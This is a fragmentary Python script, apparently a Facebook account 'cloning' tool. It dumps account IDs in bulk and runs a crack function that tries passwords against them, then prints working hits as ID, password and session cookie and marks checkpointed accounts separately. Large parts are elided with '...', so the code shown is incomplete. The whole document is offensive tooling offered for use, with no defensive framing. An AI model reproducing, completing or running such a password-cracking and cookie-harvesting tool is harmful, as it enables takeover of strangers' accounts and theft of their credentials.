...
print('\033[1;37m[\033[1;37m+\033[1;37m] \033[1;37mChecking Update...? ')
time.sleep(5)
os.system('clear')
print("\033[1;37m[\033[1;37m+\033[1;37m] \033[1;37mADD MY FB")
time.sleep(2)
...
def menu():
    os.system('clear')
    print(logo)
    print("\033[1;37m[\033[1;37m•\033[1;37m] \033[1;37mTODAY'S DATE :\033[1;37m "+date)
    print(f"""\033[1;37m[1] Start File Cloning         """)
    print("""\033[1;37m[0] exit""")
    VEAR = input('\033[1;37mCHOOSE :  ')
    if VEAR in ['111']:
        login()
        dump_massal()
    elif VEAR in ['1']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \r[ MR,VEAR ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}  {P}\033[1;31m{x}  {bo}{'{}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
   ...
   "scheme": 'https',
    ...
    'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\033[1;31mMR,VEAR-CP   \033[1;31m{idf} |  \033[1;31m{pw}  ')
                ...
                print(f'\r\x1b[32[MR,VEAR-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
